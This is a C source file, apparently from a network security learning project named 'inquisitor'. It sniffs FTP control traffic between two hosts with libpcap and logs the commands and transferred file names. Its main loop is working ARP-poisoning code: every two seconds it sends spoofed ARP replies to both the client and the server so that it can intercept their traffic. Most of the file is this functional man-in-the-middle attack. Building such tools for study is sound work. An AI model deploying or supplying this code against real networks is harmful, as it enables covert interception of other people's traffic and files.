#include <inquisitor.h>
#include <libft.h>
#include <pcap.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <time.h>

#define	FILTER_BUFF_SIZE 256
#define	POISON_INTERVAL 2

typedef struct	s_capture_ctx {
	uint32_t	link_hdr_len;
}				t_capture_ctx;

// Kept for later (detecting ARP requests to react on); unused for now.
__attribute__((unused))
static void build_arp_filter(t_args *args, char buff[]) {
	uint32_t src_ip = ntohl(args->src_addr.s_addr);
	uint32_t dst_ip = ntohl(args->dst_addr.s_addr);

	snprintf(buff, FILTER_BUFF_SIZE,
		"(arp[8:4] = 0x%02x%02x%02x%02x and "
		"arp[12:2] = 0x%02x%02x and "
		"arp[14:4] = 0x%08x and "
		"arp[24:4] = 0x%08x)",
		args->src_mac.ether_addr_octet[0],
		args->src_mac.ether_addr_octet[1],
		args->src_mac.ether_addr_octet[2],
		args->src_mac.ether_addr_octet[3],
		args->src_mac.ether_addr_octet[4],
		args->src_mac.ether_addr_octet[5],
		src_ip,
		dst_ip);
}

static void build_ftp_filter(t_args *args, char buff[]) {
	char	src[INET_ADDRSTRLEN] = { 0 };
	char	dst[INET_ADDRSTRLEN] = { 0 };

	inet_ntop(AF_INET, &args->src_addr, src, sizeof(src));
	inet_ntop(AF_INET, &args->dst_addr, dst, sizeof(dst));
	snprintf(buff, FILTER_BUFF_SIZE,
		"(tcp port 20 or tcp port 21) and host %s and host %s", src, dst);
}

static int apply_filter(pcap_t *handle, const char filter_exp[]) {
	if (!filter_exp) {
		return (0);
	}
	if (!handle) {
		ERR("Invalid handle.\n");
		return (1);
	}
	struct bpf_program	fp;
	if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
		ERR("Couldn't parse filter `%s`: %s\n", filter_exp, pcap_geterr(handle));
		return (1);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
		ERR( "Couldn't apply filter: %s\n", pcap_geterr(handle));
		pcap_freecode(&fp);
		return (1);
	}
	pcap_freecode(&fp);
	return (0);
}

static pcap_t	*create_pcap_handle(const char *filter_exp) {
	char	errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	pcap_t	*handle = pcap_open_live(CAPTURE_DEVICE, BUFSIZ, 1, 1000, errbuf);

	if (!handle) {
		ERR("pcap_open_live(%s): %s\n", CAPTURE_DEVICE, errbuf);
		return (NULL);
	}
	DBG("Capture Filter: %s\n", filter_exp);
	if (apply_filter(handle, filter_exp)) {
		ERR("Failed to apply filter\n");
		pcap_close(handle);
		return (NULL);
	}
	return (handle);
}

// Length of the link-layer header for the capture device. "any" on Linux
// uses a 16-byte cooked (SLL) header, a real interface uses 14-byte Ethernet.
static uint32_t link_header_len(int datalink) {
	switch (datalink) {
		case DLT_EN10MB:	return (14);
		case DLT_LINUX_SLL:	return (16);
#ifdef DLT_LINUX_SLL2
		case DLT_LINUX_SLL2:	return (20);
#endif
		default:		return (14);
	}
}

// Print each CRLF-terminated line of the FTP control channel, and flag the
// filename on RETR (download) / STOR (upload). Payload is not NUL-terminated.
static void handle_ftp_control(const u_char *payload, int len, int from_server) {
	const u_char	*p = payload;
	const u_char	*end = payload + len;

	while (p < end) {
		const u_char	*nl = ft_memchr(p, '\n', end - p);
		const u_char	*line_end = nl ? nl : end;
		int				llen = (int)(line_end - p);

		if (llen > 0 && p[llen - 1] == '\r')
			llen--;
		if (llen > 0) {
			INFO("FTP %c: %.*s\n", from_server ? 'S' : 'C', llen, p);
			if (!from_server && llen > 5 &&
				(ft_strncmp((char *)p, "RETR ", 5) == 0 ||
				 ft_strncmp((char *)p, "STOR ", 5) == 0)) {
				INFO("  -> file: %.*s\n", llen - 5, p + 5);
			}
		}
		if (!nl)
			break;
		p = nl + 1;
	}
}

static void handle_packet(u_char *user, const struct pcap_pkthdr *header, const u_char *packet) {
	t_capture_ctx	*ctx = (t_capture_ctx *)user;
	uint32_t		caplen = header->caplen;
	uint32_t		l3off = ctx->link_hdr_len;

	if (caplen < l3off + sizeof(struct iphdr))
		return;
	const struct iphdr	*ip = (const struct iphdr *)(packet + l3off);
	if (ip->version != 4 || ip->protocol != IPPROTO_TCP)
		return;
	uint32_t	ip_hl = (uint32_t)ip->ihl * 4;
	if (ip_hl < sizeof(struct iphdr) || caplen < l3off + ip_hl + sizeof(struct tcphdr))
		return;
	const struct tcphdr	*tcp = (const struct tcphdr *)((const u_char *)ip + ip_hl);
	uint32_t	tcp_hl = (uint32_t)tcp->th_off * 4;
	if (tcp_hl < sizeof(struct tcphdr))
		return;

	uint32_t	hdrs = l3off + ip_hl + tcp_hl;
	if (caplen <= hdrs)
		return;
	const u_char	*payload = packet + hdrs;
	int				payload_len = (int)(caplen - hdrs);

	uint16_t	sport = ntohs(tcp->th_sport);
	uint16_t	dport = ntohs(tcp->th_dport);
	if (sport == 21)
		handle_ftp_control(payload, payload_len, 1);
	else if (dport == 21)
		handle_ftp_control(payload, payload_len, 0);
	// port 20 (data channel content) handled later
}

int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
	char	filter_buffer[FILTER_BUFF_SIZE] = { 0 };
	build_ftp_filter(args, filter_buffer);

	pcap_t	*handle = create_pcap_handle(filter_buffer);
	if (!handle) {
		return (1);
	}

	char	errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	if (pcap_setnonblock(handle, 1, errbuf) == -1) {
		ERR("pcap_setnonblock: %s\n", errbuf);
		pcap_close(handle);
		return (1);
	}

	int	fd = pcap_get_selectable_fd(handle);
	if (fd == -1) {
		ERR("pcap_get_selectable_fd: not supported on this device\n");
		pcap_close(handle);
		return (1);
	}

	t_capture_ctx	ctx = { .link_hdr_len = link_header_len(pcap_datalink(handle)) };
	time_t			last_poison = 0;

	while (1) {
		struct pollfd	pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
		poll(&pfd, 1, 1000);
		pcap_dispatch(handle, -1, handle_packet, (u_char *)&ctx);

		if (time(NULL) - last_poison >= POISON_INTERVAL) {
			INFO("Sending ARP Reply\n");
			send_arp_reply(l_client);
			send_arp_reply(l_server);
			last_poison = time(NULL);
		}
	}
	pcap_close(handle);
	return (0);
}
